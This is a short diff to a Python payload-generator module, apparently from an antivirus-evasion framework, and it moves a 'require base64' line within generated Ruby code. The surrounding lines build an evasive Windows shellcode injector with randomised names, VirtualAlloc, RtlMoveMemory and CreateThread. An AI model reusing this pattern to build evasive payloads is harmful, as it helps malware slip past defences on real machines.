@@ -62,6 +62,7 @@ class PayloadModule:
         payload_code = "require 'rubygems'\n"
         payload_code += "require 'win32/api'\n"
         payload_code += "include Win32\n"
+        payload_code += "require 'base64'\n"
         # Add logic for adding this line, stupid bug and I have no idea
         # why this is even a problem, but ruby is dumb
         if self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X" or self.required_options["USERNAME"][0] != "X" or self.required_options["SLEEP"][0] != "X":
@@ -100,8 +101,6 @@ class PayloadModule:
         waitfor_random = evasion_helpers.randomString()
         protect_out = evasion_helpers.randomString()
         rand_protect = evasion_helpers.randomString()
-
-        payload_code += "require 'base64'\n"
 
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payload_code += valloc_random + " = API.new('VirtualAlloc', 'IIII', 'I');" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I');" + rand_protect + " = API.new('VirtualProtect', 'PIIP', 'I')\n"
